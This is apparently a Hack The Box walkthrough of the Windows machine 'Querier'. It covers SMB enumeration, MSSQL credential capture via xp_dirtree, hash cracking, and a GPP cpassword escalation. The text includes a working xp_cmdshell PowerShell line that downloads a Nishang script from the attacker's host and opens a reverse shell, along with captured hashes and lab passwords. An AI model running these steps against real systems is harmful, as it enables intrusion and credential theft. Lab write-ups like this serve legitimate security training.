# QUERIER
### Info:
OS: Windows<br>
IP: 10.10.10.125<br>
Difficulty :  Medium<br>
### Enumeration:
```
nmap -sC -sV -oA nmap 10.10.10.125<ip>
```
gives us the results : <br>
![alt text](https://i.imgur.com/njANk2u.png)
As we see port 139 Open. Therefore checking the shares via smbclient. <br>
```
root@kali:~/Desktop/boxes/Querier# smbclient -L \\\\10.10.10.125 -N
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      

```
The share named Reports had a .xlsm file inside.
```
root@kali:~/Desktop/boxes/Querier# smbclient \\\\10.10.10.125\\Reports -N 
WARNING: The "syslog" option is deprecated
Try "help" to get a list of possible commands.
smb: \> 
smb: \> ls
  .                                   D        0  Tue Jan 29 04:53:48 2019
  ..                                  D        0  Tue Jan 29 04:53:48 2019
  Currency Volume Report.xlsm         A    12229  Mon Jan 28 03:51:34 2019

		6469119 blocks of size 4096. 1589920 blocks available
smb: \> get "Currency Volume Report.xlsm"
```
As I was on Kali therefore searching for how to open xlsm files resulted in a cli tool `Olevba`
![alt text](https://i.imgur.com/tYCbn6J.png) <br>
We get the creds for the Microsoft SQL server (port 1433) <br>
```
Username: reporting
Pass: PcwTWTHRwryjc$c6
Database: volume
```
Via impacket (https://github.com/SecureAuthCorp/impacket) we can use mssqlclient to login.
We cannot run `xp_cmdshell`
<br>
### Exploitation:
After googling for a while I found this : <br>
https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
We can capture MSSQL Creds with `xp_dirtree` and `impacket-smbserver`. <br>xp_dirtree
display a list of every folder, every subfolder, and every file for the path you give it. In this case we
will create a shared document and then we will list it with xp_dirtree so that the connection will
send us the hash.
```
impacket-smbserver -smb2support myshare (local host)
EXEC master.sys.xp_dirtree ‘\\10.10.17.29\myshare’,1, 1 (mssqlclient)
```
This gives us on our local machine: 
```
root@kali:~/Desktop/boxes/Querier# smbserver.py -smb2support myshare /Impacket 
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.125,49672)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User mssql-svc\QUERIER authenticated successfully
[*] mssql-svc::QUERIER:4141414141414141:8dd343e53e5affe0f13851fe469eb48d:010100000000000000acc7f9b2e0d4012e9af9fa98326f050000000001001000720042006e004b0044007600630054000200100069004400640054004d0049007500670003001000720042006e004b0044007600630054000400100069004400640054004d004900750067000700080000acc7f9b2e0d40106000400020000000800300030000000000000000000000000300000536b8f9ae8bc9644e79dfd5e523681893bf75a7d585f5f8056a77662f416ca0c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310037002e0032003900000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:myshare)
[*] AUTHENTICATE_MESSAGE (\,QUERIER)
[*] User \QUERIER authenticated successfully
[*] :::00::4141414141414141
[*] Disconnecting Share(1:IPC$)
```
I tried breaking the mssql-svc hash via hashcat but it didn't work for me (gave false positives, 
and cracked the pass as `corradosl6`). Therefore by using classic john as :
![alt text](https://i.imgur.com/vQDPcid.png)
We get the creds for user `mssql-svc`, and we can now login and get the user flag! 
<br>
### Privilege Escalation:
We can run a nishang powershell reverse tcp script, on the `mssql-svc` user. <br>
```
xp_cmdshell "powershell -c  IEX(New-Object Net.WebClient).DownloadString(''http://10.10.17.29:8000/nishangpowershell.ps1'');
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.17.29 -Port 1234"
```
Command Explanation : <br>
We used IEX (Invoke Expression - Runs commands or expressions on the local computer.) <br>
We used DownloadString instead of DownloadFile as SQL server blocked access to procedure. <br>
We got the file from our local system by (python -m SimpleHTTPServer (in the foler containing nishang ps1 script))<br>
We used double single quotes becuase single quotes are escaped by doubling them up (https://stackoverflow.com/questions/1586560/how-do-i-escape-a-single-quote-in-sql-server) <br>
And finally we invoked the function Invoke-PowerShellTcp after loading it in the memory. <br>
Firing up `nc -lvnp port` gave us a shell.  <br>
Running PowerUp.ps1 (windows privesc script) we find a group policy vulnerability. <br>
`PS C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups>`
Therefore looking inside we found an xml file.
![alt text](https://i.imgur.com/zXV1PFr.png)
and breaking that cpassword by gp3finder we get:
![alt text](https://i.imgur.com/m0yRBMV.png)
Therefore we can get a shell for Administrator with the password `MyUnclesAreMarioAndLuigi!!1!` via:
```
python psexec.py Administrator@10.10.10.125 (via Impacket)
```
### Gained knowledge:
Impacket <br>
Capturing MSSQL Creds <br>
Powershell Scripting



